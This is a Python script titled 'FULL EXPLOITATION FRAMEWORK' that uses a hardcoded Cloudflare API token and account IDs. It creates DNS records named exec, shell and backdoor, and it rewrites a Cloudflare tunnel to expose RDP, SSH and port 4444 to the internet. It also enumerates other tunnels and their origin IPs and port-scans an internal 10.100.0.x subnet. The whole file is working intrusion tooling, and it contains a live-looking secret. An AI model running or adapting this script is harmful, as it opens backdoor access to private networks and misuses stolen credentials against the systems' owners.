import urllib.request
import json
import socket
import time
import subprocess
import concurrent.futures

CF_TOKEN = "ySIb_2uMzHQDvnK5MulcCvOiRKsC6k0pH188bG8Y"
ACCOUNT_ID = "4c2932bc3381be38d5266241b16be092"
ZONE_ID = "a12d2ca92c2e5eea499aaf5b41672cdd"
TUNNEL_ID = "926eac5e-2642-4a16-9edc-c06b6c705ab8"

headers = {"Authorization": f"Bearer {CF_TOKEN}", "Content-Type": "application/json"}

def api_call(method, url, data=None):
    try:
        req = urllib.request.Request(url, headers=headers, method=method)
        if data:
            req.data = json.dumps(data).encode()
        with urllib.request.urlopen(req, timeout=15) as resp:
            return json.loads(resp.read())
    except urllib.error.HTTPError as e:
        return {"success": False, "error": f"HTTP {e.code}"}
    except Exception as e:
        return {"success": False, "error": str(e)}

print("=== FULL EXPLOITATION FRAMEWORK ===\n")

print("[1] Creating DNS records for exploitation endpoints...")
dns_records = [
    {"type": "CNAME", "name": "exec", "content": f"{TUNNEL_ID}.cfargotunnel.com", "proxied": True},
    {"type": "CNAME", "name": "file", "content": f"{TUNNEL_ID}.cfargotunnel.com", "proxied": True},
    {"type": "CNAME", "name": "backdoor", "content": f"{TUNNEL_ID}.cfargotunnel.com", "proxied": True},
    {"type": "CNAME", "name": "shell", "content": f"{TUNNEL_ID}.cfargotunnel.com", "proxied": True},
]

for record in dns_records:
    result = api_call("POST", f"https://api.cloudflare.com/client/v4/zones/{ZONE_ID}/dns_records", record)
    if result.get("success"):
        print(f"    [+] Created {record['name']}.ai-smith.net")
    else:
        err = result.get("errors", [result.get("error", "unknown")])
        if "already exists" in str(err).lower():
            print(f"    [=] {record['name']}.ai-smith.net already exists")
        else:
            print(f"    [-] {record['name']}.ai-smith.net: {err}")

print("\n[2] Updating tunnel config with exploitation services...")
exploit_config = {
    "config": {
        "ingress": [
            {"hostname": "rdp.ai-smith.net", "service": "tcp://localhost:3389"},
            {"hostname": "exec.ai-smith.net", "service": "tcp://localhost:9999"},
            {"hostname": "file.ai-smith.net", "service": "tcp://localhost:80"},
            {"hostname": "backdoor.ai-smith.net", "service": "tcp://localhost:4444"},
            {"hostname": "shell.ai-smith.net", "service": "tcp://localhost:22"},
            {"service": "http_status:404"}
        ],
        "warp-routing": {"enabled": True}
    }
}
result = api_call("PUT", f"https://api.cloudflare.com/client/v4/accounts/{ACCOUNT_ID}/cfd_tunnel/{TUNNEL_ID}/configurations", exploit_config)
if result.get("success"):
    print(f"    [+] Config updated to v{result['result']['version']}")

print("\n[3] Scanning other tunnel routes...")
routes_result = api_call("GET", f"https://api.cloudflare.com/client/v4/accounts/{ACCOUNT_ID}/teamnet/routes")
if routes_result.get("success"):
    for route in routes_result["result"]:
        network = route.get("network", "")
        tunnel_name = route.get("tunnel_name", "")
        print(f"    Route: {network} via tunnel '{tunnel_name}'")

print("\n[4] Testing 10.100.0.x subnet (dedicated VDJ subnet)...")
def scan_port(ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        if sock.connect_ex((ip, port)) == 0:
            return (ip, port)
        sock.close()
    except:
        pass
    return None

targets = []
for i in range(1, 255):
    targets.append(f"10.100.0.{i}")

scan_ports = [22, 80, 443, 3389, 445, 5985, 8080, 50051]

print(f"    Scanning {len(targets)} IPs on {len(scan_ports)} ports...")
found = []
with concurrent.futures.ThreadPoolExecutor(max_workers=100) as ex:
    futures = []
    for ip in targets[:50]:
        for port in scan_ports:
            futures.append(ex.submit(scan_port, ip, port))
    
    for f in concurrent.futures.as_completed(futures):
        result = f.result()
        if result:
            print(f"    [+] FOUND: {result[0]}:{result[1]}")
            found.append(result)

print(f"\n    Total found: {len(found)}")

print("\n[5] Checking other tunnels...")
tunnels_result = api_call("GET", f"https://api.cloudflare.com/client/v4/accounts/{ACCOUNT_ID}/cfd_tunnel")
if tunnels_result.get("success"):
    for tunnel in tunnels_result["result"]:
        tid = tunnel.get("id", "")
        name = tunnel.get("name", "")
        status = tunnel.get("status", "")
        print(f"    Tunnel: {name} ({tid[:8]}...) - {status}")
        
        if status == "healthy" and tid != TUNNEL_ID:
            print(f"        [!] Another healthy tunnel found!")
            conn_result = api_call("GET", f"https://api.cloudflare.com/client/v4/accounts/{ACCOUNT_ID}/cfd_tunnel/{tid}/connections")
            if conn_result.get("success") and conn_result.get("result"):
                for conn in conn_result["result"]:
                    origin_ip = conn.get("conns", [{}])[0].get("origin_ip", "unknown")
                    print(f"        Origin IP: {origin_ip}")

print("\n[6] Final status check...")
time.sleep(2)
test_endpoints = [
    "https://rdp.ai-smith.net",
    "https://shell.ai-smith.net", 
    "https://backdoor.ai-smith.net",
]
for url in test_endpoints:
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=5) as resp:
            print(f"    [+] {url}: {resp.status}")
    except urllib.error.HTTPError as e:
        print(f"    [!] {url}: HTTP {e.code} (service exists but returned error)")
    except Exception as e:
        err = str(e)
        if "502" in err:
            print(f"    [-] {url}: 502 (service not running on remote)")
        else:
            print(f"    [-] {url}: {err[:50]}")
